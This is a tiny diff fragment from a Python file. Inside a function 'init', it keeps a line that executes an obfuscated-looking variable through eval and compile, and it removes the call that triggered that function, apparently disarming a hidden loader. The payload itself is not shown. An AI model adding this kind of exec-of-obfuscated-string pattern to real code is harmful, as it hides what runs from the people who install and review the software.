@@ -12,4 +12,4 @@ def init():
 
 
     eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))
-init()
+
